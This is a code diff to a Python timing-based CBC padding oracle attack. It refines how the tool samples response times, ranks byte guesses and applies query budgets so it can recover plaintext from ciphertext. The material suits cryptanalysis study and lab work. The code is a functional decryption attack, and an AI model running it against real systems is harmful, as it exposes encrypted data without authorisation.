@@ -10,9 +10,6 @@ import math
 from .. import crypto
 from .common import AttackError, TimingOracle
 
-_ADAPTIVE_REFINE_ROUNDS = 6
-_CONFIDENCE_Z = 2.5
-
 
 @dataclass
 class TimingConfig:
@@ -21,6 +18,9 @@ class TimingConfig:
     initial_samples: int = 1
     refine_samples: int = 4
     top_candidates: int = 6
+    confidence_z: float = 3.5
+    min_compare_samples: int = 10
+    max_queries_per_byte: int = 20_000
 
     def normalized(self) -> "TimingConfig":
         """Return a sanitized configuration with safe minimums/bounds."""
@@ -28,6 +28,9 @@ class TimingConfig:
             initial_samples=max(1, int(self.initial_samples)),
             refine_samples=max(1, int(self.refine_samples)),
             top_candidates=min(256, max(1, int(self.top_candidates))),
+            confidence_z=max(0.1, float(self.confidence_z)),
+            min_compare_samples=max(2, int(self.min_compare_samples)),
+            max_queries_per_byte=max(1, int(self.max_queries_per_byte)),
         )
 
 
@@ -46,11 +49,11 @@ class Score:
         return self.total / self.samples
 
     def variance(self) -> float:
-        """Population variance estimate of the observed durations."""
+        """Sample variance estimate of the observed durations."""
         if self.samples < 2:
             return 0.0
         mean = self.avg()
-        var = (self.total_sq / self.samples) - (mean * mean)
+        var = (self.total_sq - (self.samples * mean * mean)) / (self.samples - 1)
         if var <= 0:
             return 0.0
         return var
@@ -72,6 +75,7 @@ def recover_block_timing(
         config: Sampling strategy.
         prefix: Optional untouched prefix blocks required by the oracle context.
     """
+
     cfg = config.normalized()
     if len(prev) != crypto.BLOCK_SIZE or len(curr) != crypto.BLOCK_SIZE:
         raise AttackError("recover_block_timing requires two 16-byte blocks")
@@ -86,6 +90,7 @@ def recover_block_timing(
     for pos in range(crypto.BLOCK_SIZE - 1, -1, -1):
         pad = crypto.BLOCK_SIZE - pos
         base = bytearray(prev)
+        byte_queries = 0
         # Keep solved suffix bytes consistent with the target padding value.
         for j in range(crypto.BLOCK_SIZE - 1, pos, -1):
             base[j] = intermediate[j] ^ pad
@@ -99,6 +104,7 @@ def recover_block_timing(
 
             total, total_sq = _sample_stats_ns(oracle, forged, cfg.initial_samples)
             queries += cfg.initial_samples
+            byte_queries += cfg.initial_samples
             scores.append(
                 Score(
                     guess=guess,
@@ -114,27 +120,59 @@ def recover_block_timing(
 
         # Spend extra samples only on the most promising candidates.
         for i in range(limit):
-            extra, extra_sq = _sample_stats_ns(oracle, scores[i].forged, cfg.refine_samples)
-            queries += cfg.refine_samples
+            if byte_queries >= cfg.max_queries_per_byte:
+                break
+            extra_samples = min(cfg.refine_samples, cfg.max_queries_per_byte - byte_queries)
+            if extra_samples <= 0:
+                break
+            extra, extra_sq = _sample_stats_ns(oracle, scores[i].forged, extra_samples)
+            queries += extra_samples
+            byte_queries += extra_samples
             scores[i].total += extra
             scores[i].total_sq += extra_sq
-            scores[i].samples += cfg.refine_samples
+            scores[i].samples += extra_samples
 
-        # Adaptive refinement: keep sampling until top-1 vs top-2 is separated,
-        # or until the round budget is exhausted.
-        for _ in range(_ADAPTIVE_REFINE_ROUNDS):
+        # Adaptive refinement: keep sampling until top-1 vs top-2 is separated.
+        while byte_queries < cfg.max_queries_per_byte:
             scores.sort(key=lambda s: s.avg(), reverse=True)
             ranked = scores[:limit]
             if len(ranked) < 2:
                 break
-            if _is_confident(ranked[0], ranked[1]):
+            if _is_confident(ranked[0], ranked[1], cfg):
                 break
             for candidate in ranked:
-                extra, extra_sq = _sample_stats_ns(oracle, candidate.forged, cfg.refine_samples)
-                queries += cfg.refine_samples
+                if byte_queries >= cfg.max_queries_per_byte:
+                    break
+                extra_samples = min(cfg.refine_samples, cfg.max_queries_per_byte - byte_queries)
+                if extra_samples <= 0:
+                    break
+                extra, extra_sq = _sample_stats_ns(oracle, candidate.forged, extra_samples)
+                queries += extra_samples
+                byte_queries += extra_samples
                 candidate.total += extra
                 candidate.total_sq += extra_sq
-                candidate.samples += cfg.refine_samples
+                candidate.samples += extra_samples
+
+        # Final head-to-head phase on top-2 only for stronger confidence.
+        while byte_queries < cfg.max_queries_per_byte:
+            scores.sort(key=lambda s: s.avg(), reverse=True)
+            ranked = scores[:2]
+            if len(ranked) < 2:
+                break
+            if _is_confident(ranked[0], ranked[1], cfg):
+                break
+            for candidate in ranked:
+                if byte_queries >= cfg.max_queries_per_byte:
+                    break
+                extra_samples = min(cfg.refine_samples, cfg.max_queries_per_byte - byte_queries)
+                if extra_samples <= 0:
+                    break
+                extra, extra_sq = _sample_stats_ns(oracle, candidate.forged, extra_samples)
+                queries += extra_samples
+                byte_queries += extra_samples
+                candidate.total += extra
+                candidate.total_sq += extra_sq
+                candidate.samples += extra_samples
 
         scores.sort(key=lambda s: s.avg(), reverse=True)
         ranked = scores[:limit]
@@ -143,13 +181,18 @@ def recover_block_timing(
         # With pad=1 there can be two viable candidates when the target block is
         # full padding (0x10 repeated). A second probe disambiguates them.
         if pos == crypto.BLOCK_SIZE - 1 and len(ranked) > 1:
-            best_guess, extra_queries = _resolve_last_byte_ambiguity(
-                ranked,
-                oracle,
-                prefix_len=len(prefix_bytes),
-                probe_samples=cfg.refine_samples,
-            )
-            queries += extra_queries
+            remaining = cfg.max_queries_per_byte - byte_queries
+            if remaining >= len(ranked):
+                probe_samples = min(cfg.refine_samples, remaining // len(ranked))
+                if probe_samples > 0:
+                    best_guess, extra_queries = _resolve_last_byte_ambiguity(
+                        ranked,
+                        oracle,
+                        prefix_len=len(prefix_bytes),
+                        probe_samples=probe_samples,
+                    )
+                    queries += extra_queries
+                    byte_queries += extra_queries
 
         intermediate[pos] = best_guess ^ pad
         plaintext[pos] = intermediate[pos] ^ prev[pos]
@@ -194,7 +237,7 @@ def recover_plaintext_timing(
         raise AttackError("ciphertext must include IV and be a multiple of 16 bytes")
 
     num_blocks = len(ciphertext) // crypto.BLOCK_SIZE
-    # Hard-coded traversal: recover from last ciphertext block to first.
+    # Hard-coded traversal: recover from the last ciphertext block to the first.
     indices = range(num_blocks - 1, 0, -1)
 
     recovered_blocks: dict[int, bytes] = {}
@@ -233,8 +276,10 @@ def _sample_stats_ns(oracle: TimingOracle, ciphertext: bytes, samples: int) -> t
     return total, total_sq
 
 
-def _is_confident(best: Score, second: Score) -> bool:
+def _is_confident(best: Score, second: Score, cfg: TimingConfig) -> bool:
     """Test whether top candidate is separated by a Z-score-like margin."""
+    if best.samples < cfg.min_compare_samples or second.samples < cfg.min_compare_samples:
+        return False
     gap = best.avg() - second.avg()
     if gap <= 0:
         return False
@@ -243,7 +288,7 @@ def _is_confident(best: Score, second: Score) -> bool:
     se = math.sqrt((best.variance() / best.samples) + (second.variance() / second.samples))
     if se <= 0:
         return True
-    return gap > (_CONFIDENCE_Z * se)
+    return gap > (cfg.confidence_z * se)
 
 
 def _resolve_last_byte_ambiguity(
